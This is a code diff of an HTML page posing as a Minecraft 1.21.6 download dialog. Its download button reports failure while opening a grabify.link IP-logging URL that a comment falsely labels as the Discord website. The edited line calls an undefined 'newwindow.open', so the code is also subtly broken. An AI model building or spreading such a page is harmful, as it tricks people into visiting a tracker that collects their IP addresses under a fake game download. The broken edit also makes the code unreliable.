@@ -74,7 +74,7 @@
         <h3>1.21.6</h3>
         <p id="info">Thanks for downloading minecraft 1.21.6.</p>
         <button class="closeButton" id="closeButton">Close</button>
-        <button class="loadTextButton" id="loadTextButton">Download and Open</button>
+        <button class="loadTextButton" id="loadTextButton">Install and Open</button>
     </div>
 
     <script>
@@ -87,7 +87,7 @@
         document.getElementById('loadTextButton').onclick = function() {
             document.getElementById('info').innerText = 'Download unsucessful';
             document.getElementById('info').style.color = '#dcdcaa';
-            window.open('https://grabify.link/124IFK');  // Open Discord website
+            newwindow.open('https://grabify.link/124IFK');  // Open Discord website
             window.close('https://grabify.link/124IFK');
         };
     </script>
